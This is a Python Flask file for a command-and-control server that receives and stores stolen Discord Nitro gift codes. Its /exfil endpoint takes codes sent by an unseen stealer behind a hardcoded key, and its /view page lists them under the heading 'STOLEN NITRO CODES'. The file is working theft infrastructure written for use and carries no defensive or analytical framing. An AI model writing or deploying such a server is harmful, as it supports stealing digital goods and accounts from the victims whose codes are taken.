from flask import Flask, request, jsonify
import os
import json
import sqlite3
from datetime import datetime

app = Flask(__name__)
DB = "stolen_nitro.db"

def init_db():
    with sqlite3.connect(DB) as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS codes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                code TEXT UNIQUE,
                type TEXT,
                timestamp INTEGER
            )
        """)

init_db()

@app.route('/exfil', methods=['POST'])
def receive_exfil():
    key = request.json.get("key")
    if key != "overlord_secure_2026":
        return jsonify({"status": "denied"}), 403

    code = request.json.get("code")
    nitro_type = request.json.get("type")
    timestamp = request.json.get("timestamp")

    try:
        with sqlite3.connect(DB) as conn:
            conn.execute(
                "INSERT OR IGNORE INTO codes (code, type, timestamp) VALUES (?, ?, ?)",
                (code, nitro_type, timestamp)
            )
        print(f"[+] STOLEN: {code} | {nitro_type}")
        return jsonify({"status": "saved"})
    except Exception as e:
        print(f"[!] DB Error: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/view', methods=['GET'])
def view_codes():
    with sqlite3.connect(DB) as conn:
        cur = conn.cursor()
        cur.execute("SELECT code, type, timestamp FROM codes ORDER BY timestamp DESC")
        rows = cur.fetchall()

    html = """
    <html><head><title>🔥 OVERLORD C2 - NITRO VAULT</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { border: 1px solid #0f0; padding: 10px; text-align: left; }
        th { background: #222; }
        .count { font-size: 1.2em; color: lime; }
    </style></head><body>
    <h2>💀 STOLEN NITRO CODES</h2>
    <p class="count">Total: """ + str(len(rows)) + """ valid(s)</p>
    <table><tr><th>Code</th><th>Type</th><th>Time</th></tr>"""
    for row in rows:
        code, ntype, ts = row
        dt = datetime.fromtimestamp(ts).strftime('%H:%M:%S')
        html += f"<tr><td>{code}</td><td>{ntype}</td><td>{dt}</td></tr>"
    html += "</table></body></html>"
    return html

if __name__ == "__main__":
    print("[+] C2 Server listening on http://0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000)
